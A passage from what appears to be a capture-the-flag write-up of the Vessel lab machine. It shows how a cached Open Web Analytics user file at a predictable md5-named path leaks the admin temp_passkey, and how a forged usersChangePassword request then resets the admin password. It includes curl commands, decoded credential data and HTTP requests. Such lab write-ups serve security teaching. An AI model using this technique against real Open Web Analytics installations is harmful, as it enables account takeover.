+<p>It’s not hard to picture that the user attempts to log in, then the database goes to get the user object (and it happens to get cached for a short time).</p>
+<p>If that’s the case, then the <code class="language-plaintext highlighter-rouge">$col</code> is “user_id”. If that’s right, then the filename will be <code class="language-plaintext highlighter-rouge">c30da9265ba0a4704db9229f864c9eb7.php</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"user_id1"</span> | <span class="nb">md5sum</span>
+<span class="go">c30da9265ba0a4704db9229f864c9eb7  -
+</span></code></pre></div></div>
+<h4 id="get-temp_pass">Get temp_pass</h4>
+<p>After attempting a login, the file exists:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/c30da9265ba0a4704db9229f864c9eb7.php
+<span class="go">&lt;?php\n/*Tzo4OiJvd2FfdXNlciI6NTp7czo0OiJuYW1lIjtzOjk6ImJhc2UudXNlciI7czoxMDoicHJvcGVydGllcyI7YToxMDp7czoyOiJpZCI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MToiMSI7czo5OiJkYXRhX3R5cGUiO3M6NjoiU0VSSUFMIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjc6InVzZXJfaWQiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjoxO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjg6InBhc3N3b3JkIjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO047czo1OiJ2YWx1ZSI7czo2MDoiJDJ5JDEwJGFxOVJqemhPMXNUbzBmZm5QU21HSC5aaW5SQzNMbzlLajg3cnRsaWR0UFFFY2NIMFprd09lIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjQ6InJvbGUiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjk6InJlYWxfbmFtZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTM6ImRlZmF1bHQgYWRtaW4iO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fXM6MTM6ImVtYWlsX2FkZHJlc3MiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjE2OiJhZG1pbkB2ZXNzZWwuaHRiIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjEyOiJ0ZW1wX3Bhc3NrZXkiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjMyOiI4MmYxMTUyYjRiM2RiNDI0MTM5YzIwMzBkMDQ3MjNiNCI7czo5OiJkYXRhX3R5cGUiO3M6MTI6IlZBUkNIQVIoMjU1KSI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxMzoiY3JlYXRpb25fZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxNjoibGFzdF91cGRhdGVfZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czo3OiJhcGlfa2V5IjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO3M6NzoiYXBpX2tleSI7czo1OiJ2YWx1ZSI7czozMjoiYTM5MGNjMDI0N2VjYWRhOWEyYjhkMjMzOGI5Y2E2ZDIiO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fX1zOjE2OiJfdGFibGVQcm9wZXJ0aWVzIjthOjQ6e3M6NToiYWxpYXMiO3M6NDoidXNlciI7czo0OiJuYW1lIjtzOjg6Im93YV91c2VyIjtzOjk6ImNhY2hlYWJsZSI7YjoxO3M6MjM6ImNhY2hlX2V4cGlyYXRpb25fcGVyaW9kIjtpOjYwNDgwMDt9czoxMjoid2FzUGVyc2lzdGVkIjtiOjE7czo1OiJjYWNoZSI7Tjt9*/\n?&gt;
+</span></code></pre></div></div>
+<p>The text starts with <code class="language-plaintext highlighter-rouge">&lt;?php\n</code> just like expected, and then a PHP comment with a base64-encoded blob. I’ll base64 decode to get a serialized PHP object:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"Tzo4OiJvd2FfdXNlciI6NTp7czo0OiJuYW1lIjtzOjk6ImJhc2UudXNlciI7czoxMDoicHJvcGVydGllcyI7YToxMDp7czoyOiJpZCI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MToiMSI7czo5OiJkYXRhX3R5cGUiO3M6NjoiU0VSSUFMIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjc6InVzZXJfaWQiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjoxO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjg6InBhc3N3b3JkIjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO047czo1OiJ2YWx1ZSI7czo2MDoiJDJ5JDEwJGFxOVJqemhPMXNUbzBmZm5QU21HSC5aaW5SQzNMbzlLajg3cnRsaWR0UFFFY2NIMFprd09lIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjQ6InJvbGUiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjk6InJlYWxfbmFtZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTM6ImRlZmF1bHQgYWRtaW4iO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fXM6MTM6ImVtYWlsX2FkZHJlc3MiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjE2OiJhZG1pbkB2ZXNzZWwuaHRiIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjEyOiJ0ZW1wX3Bhc3NrZXkiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjMyOiI4MmYxMTUyYjRiM2RiNDI0MTM5YzIwMzBkMDQ3MjNiNCI7czo5OiJkYXRhX3R5cGUiO3M6MTI6IlZBUkNIQVIoMjU1KSI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxMzoiY3JlYXRpb25fZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxNjoibGFzdF91cGRhdGVfZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czo3OiJhcGlfa2V5IjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO3M6NzoiYXBpX2tleSI7czo1OiJ2YWx1ZSI7czozMjoiYTM5MGNjMDI0N2VjYWRhOWEyYjhkMjMzOGI5Y2E2ZDIiO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fX1zOjE2OiJfdGFibGVQcm9wZXJ0aWVzIjthOjQ6e3M6NToiYWxpYXMiO3M6NDoidXNlciI7czo0OiJuYW1lIjtzOjg6Im93YV91c2VyIjtzOjk6ImNhY2hlYWJsZSI7YjoxO3M6MjM6ImNhY2hlX2V4cGlyYXRpb25fcGVyaW9kIjtpOjYwNDgwMDt9czoxMjoid2FzUGVyc2lzdGVkIjtiOjE7czo1OiJjYWNoZSI7Tjt9"</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+<span class="go">O:8:"owa_user":5:{s:4:"name";s:9:"base.user";s:10:"properties";a:10:{s:2:"id";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:1:"1";s:9:"data_type";s:6:"SERIAL";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:7:"user_id";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:5:"admin";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:1;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:8:"password";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:60:"$2y$10$aq9RjzhO1sTo0ffnPSmGH.ZinRC3Lo9Kj87rtlidtPQEccH0ZkwOe";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:4:"role";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:5:"admin";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:9:"real_name";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:13:"default admin";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:13:"email_address";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:16:"admin@vessel.htb";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:12:"temp_passkey";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:32:"82f1152b4b3db424139c2030d04723b4";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:13:"creation_date";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:10:"1650211659";s:9:"data_type";s:6:"BIGINT";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:16:"last_update_date";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:10:"1650211659";s:9:"data_type";s:6:"BIGINT";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:7:"api_key";O:12:"owa_dbColumn":11:{s:4:"name";s:7:"api_key";s:5:"value";s:32:"a390cc0247ecada9a2b8d2338b9ca6d2";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}}s:16:"_tableProperties";a:4:{s:5:"alias";s:4:"user";s:4:"name";s:8:"owa_user";s:9:"cacheable";b:1;s:23:"cache_expiration_period";i:604800;}s:12:"wasPersisted";b:1;s:5:"cache";N;}
+</span></code></pre></div></div>
+<p>In this item, I’ll find the admin user, with password hash and <code class="language-plaintext highlighter-rouge">temp_passkey</code>:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20230321104505447.png"><img alt="image-20230321104505447" src="https://0xdfimages.gitlab.io/img/image-20230321104505447.png"/><em>Click for full size image</em></a></p>
+<h4 id="admin-login">Admin Login</h4>
+<p>The blog post says:</p>
+<blockquote>
+<p>Though the <strong>temp_passkey</strong> can directly be used to set a new password for the user via the <strong>base.usersChangePassword</strong> action.</p>
+</blockquote>
+<p>The <a href="https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/release-1.7.3/modules/base/usersChangePassword.php">source</a> for this class includes the following <code class="language-plaintext highlighter-rouge">action</code> function:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">function</span> <span class="n">action</span><span class="p">()</span> <span class="p">{</span>
+        
+        <span class="c1">// needed for old style embedded install migration</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getParam</span><span class="p">(</span><span class="s1">'is_embedded'</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+            
+            <span class="n">owa_coreAPI</span><span class="o">::</span><span class="nf">setSetting</span><span class="p">(</span><span class="s1">'base'</span><span class="p">,</span> <span class="s1">'is_embedded'</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+        <span class="p">}</span>
+        
+        
+        <span class="nv">$auth</span> <span class="o">=</span> <span class="n">owa_auth</span><span class="o">::</span><span class="nf">get_instance</span><span class="p">();</span>
+        <span class="nv">$status</span> <span class="o">=</span> <span class="nv">$auth</span><span class="o">-&gt;</span><span class="nf">authenticateUserTempPasskey</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">params</span><span class="p">[</span><span class="s1">'k'</span><span class="p">]);</span>
+
+        <span class="c1">// log to event queue</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$status</span> <span class="o">===</span> <span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$ed</span> <span class="o">=</span> <span class="n">owa_coreAPI</span><span class="o">::</span><span class="nf">getEventDispatch</span><span class="p">();</span>
+            <span class="nv">$new_password</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'key'</span> <span class="o">=&gt;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">params</span><span class="p">[</span><span class="s1">'k'</span><span class="p">],</span> <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">params</span><span class="p">[</span><span class="s1">'password'</span><span class="p">],</span> <span class="s1">'ip'</span> <span class="o">=&gt;</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">],</span> <span class="s1">'user_id'</span> <span class="o">=&gt;</span> <span class="nv">$auth</span><span class="o">-&gt;</span><span class="n">u</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'user_id'</span><span class="p">));</span>
+            <span class="nv">$ed</span><span class="o">-&gt;</span><span class="nb">log</span><span class="p">(</span><span class="nv">$new_password</span><span class="p">,</span> <span class="s1">'base.set_password'</span><span class="p">);</span>
+            <span class="nv">$auth</span><span class="o">-&gt;</span><span class="nf">deleteCredentials</span><span class="p">();</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">setRedirectAction</span><span class="p">(</span><span class="s1">'base.loginForm'</span><span class="p">);</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">set</span><span class="p">(</span><span class="s1">'status_code'</span><span class="p">,</span> <span class="mi">3006</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">setRedirectAction</span><span class="p">(</span><span class="s1">'base.loginForm'</span><span class="p">);</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">set</span><span class="p">(</span><span class="s1">'error_code'</span><span class="p">,</span> <span class="mi">2011</span><span class="p">);</span> <span class="c1">// can't find key in the db</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+<p>It’s using <code class="language-plaintext highlighter-rouge">$this-&gt;params['k']</code> to authorized th user, and then using that result to get the username of what to change later. I’ll note that looking at other functions, I can see that something like <code class="language-plaintext highlighter-rouge">owa_password</code> in the request is fetched by <code class="language-plaintext highlighter-rouge">$this-&gt;params['password']</code> (the “owa_” is implied somewhere).</p>
+<p>Knowing this, it looks like I need <code class="language-plaintext highlighter-rouge">owa_password</code>, <code class="language-plaintext highlighter-rouge">owa_password2</code>, <code class="language-plaintext highlighter-rouge">owa_k</code>, and <code class="language-plaintext highlighter-rouge">owa_action</code> for this request.</p>
+<p>I’ll grab the HTTP request to login and take a look:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/index.php?owa_do=base.loginForm&amp;owa_go=http%3A%2F%2Fopenwebanalytics.vessel.htb%2F&amp;</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">openwebanalytics.vessel.htb</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">128</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://openwebanalytics.vessel.htb</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://openwebanalytics.vessel.htb/index.php?owa_do=base.loginForm&amp;owa_go=http%3A%2F%2Fopenwebanalytics.vessel.htb%2F&amp;</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+
+owa_user_id=admin&amp;owa_password=asd&amp;owa_go=http%3A%2F%2Fopenwebanalytics.vessel.htb%2F&amp;owa_action=base.login&amp;owa_submit_btn=Login
+</code></pre></div></div>
+<p>I’ll send that to Repeater and play around with it a bit. I don’t need the <code class="language-plaintext highlighter-rouge">owa_go</code> and <code class="language-plaintext highlighter-rouge">owa_submit_btn</code> parameters. I can also remove the parameters in the URL, and it still returns the same failed login message. I’ll change <code class="language-plaintext highlighter-rouge">owa_action</code> to <code class="language-plaintext highlighter-rouge">base.usersChangePassword</code>. On sending, there’s a new error:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20230321105559407.png"><img alt="image-20230321105559407" src="https://0xdfimages.gitlab.io/img/image-20230321105559407.png"/><em>Click for full size image</em></a></p>
+<p>That matches what I expect from above. I’ll update the parameters to match the source, and this time it send a redirect to the login:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20230321110959249.png"><img alt="image-20230321110959249" src="https://0xdfimages.gitlab.io/img/image-20230321110959249.png"/><em>Click for full size image</em></a></p>
+<p>If I load that URL, the <code class="language-plaintext highlighter-rouge">owa_status_code</code> shows a message above the login:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230321111030275.webp" type="image/webp"/>
+<img alt="image-20230321111030275" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230321111030275.png"/>
+</picture>
+<p>And I’m able to log in:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230321111051376.webp" type="image/webp"/>
+<img alt="image-20230321111051376" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230321111051376.png"/>
+</picture>
+<h3 id="rce">RCE</h3>
+<h4 id="background">Background</h4>
